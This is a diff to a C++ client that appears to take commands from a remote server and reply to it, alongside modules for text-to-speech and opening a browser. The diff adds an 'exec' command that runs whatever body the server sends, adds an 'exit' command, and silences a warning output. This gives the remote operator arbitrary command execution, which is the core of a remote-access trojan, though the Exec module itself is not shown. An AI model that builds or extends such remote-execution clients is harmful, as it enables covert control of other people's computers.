@@ -1,6 +1,7 @@
 #include "Client.h"
 
 // modules
+#include "Exec.h"
 #include "TTS.h"
 #include "Helpers.h"
 #include "Browser.h"
@@ -24,6 +25,7 @@ std::string Client::GetUsername() {
 ProcessMap Client::Create() {
 	ProcessMap result;
 	
+	SafeAdd(Exec::Create(),		result, OP_EXEC);
 	SafeAdd(TTS::Create(),		result, OP_TTS);
 	SafeAdd(Browser::Create(),	result, OP_BROWSER);
 
@@ -81,10 +83,14 @@ std::string Client::ProcessCommand(
 	const std::string command = message.substr(0, commandSize);
 	const std::string body = message.substr(commandSize + 1);
 
-	if (command == "tts") 
+	if (command == "exec")
+		return map.at(OP_EXEC)(body);
+	else if (command == "tts")
 		return map.at(OP_TTS)(body);
-	else if (command == "open") 
+	else if (command == "open")
 		return map.at(OP_BROWSER)(body);
+	else if (command == "exit")
+		exit(0);
 
 	return "";
 }
@@ -95,11 +101,12 @@ void Client::Respond(
 	REST::ResponseCallback callback
 ) {
 	const std::wstring domain = Helpers::ToUTF16("/dms/" + username + "/response.json", CP_UTF8);
-	REST::SendRequestAsync(HOST, domain, L"PUT", '"' + body + '"', callback);
+	REST::SendRequestAsync(HOST, domain, L"PUT", body, callback);
 }
 
 void Client::ResponseHandler(REST::Response response) {
-	if (!response.isSuccessful)
-		std::cout << "\n===== WARNING =====\n" << response.body << "\n=====   END   =====\n";
+	//if (!response.isSuccessful)
+	//	std::cout << "\n===== WARNING =====\n" << response.body << "\n=====   END   =====\n";
+	std::cout << response.body << '\n';
 }
 
